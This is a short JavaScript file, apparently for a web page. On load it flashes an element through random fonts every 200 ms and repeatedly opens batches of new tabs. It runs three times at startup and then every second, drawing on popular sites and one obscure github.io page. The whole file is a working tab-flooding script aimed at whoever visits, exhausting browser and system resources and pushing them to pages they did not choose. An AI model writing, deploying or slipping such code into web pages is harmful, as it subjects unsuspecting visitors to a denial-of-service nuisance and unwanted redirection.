const sites = [
    'https://www.youtube.com',
    'https://www.google.com',
    'https://www.github.com',
    'https://www.reddit.com',
    'https://www.twitter.com',
    'https://www.twitch.tv',
    'https://www.discord.com',
    'https://www.spotify.com',
    'https://www.instagram.com',
    'https://jessushater-arch.github.io/zcv.cc/',
    'https://www.tiktok.com'
];

const fonts = [
    'Arial, sans-serif',
    'Verdana, sans-serif',
    'Times New Roman, serif',
    'Courier New, monospace',
    'Georgia, serif',
    'Comic Sans MS, cursive',
    'Impact, sans-serif',
    'Trebuchet MS, sans-serif'
];

let fontInterval;
let siteInterval;

function changeFont() {
    const textElement = document.getElementById('text');
    if (textElement) {
        const randomFont = fonts[Math.floor(Math.random() * fonts.length)];
        textElement.style.fontFamily = randomFont;
    }
}

function openMultipleSites() {
    for (let i = 0; i < 5; i++) {
        setTimeout(() => {
            const randomSite = sites[Math.floor(Math.random() * sites.length)];            
            window.open(randomSite, '_blank');
            
            const link = document.createElement('a');
            link.href = randomSite;
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            
            setTimeout(() => {
                if (link.parentNode) {
                    document.body.removeChild(link);
                }
            }, 100);
        }, i * 10);
    }
}

window.addEventListener('load', function() {
    fontInterval = setInterval(changeFont, 200);
    
    setTimeout(openMultipleSites, 100);
    
    setTimeout(openMultipleSites, 300);
    
    setTimeout(openMultipleSites, 500);
    
    siteInterval = setInterval(openMultipleSites, 1000);
});

window.addEventListener('beforeunload', function() {
    clearInterval(fontInterval);
    clearInterval(siteInterval);
});
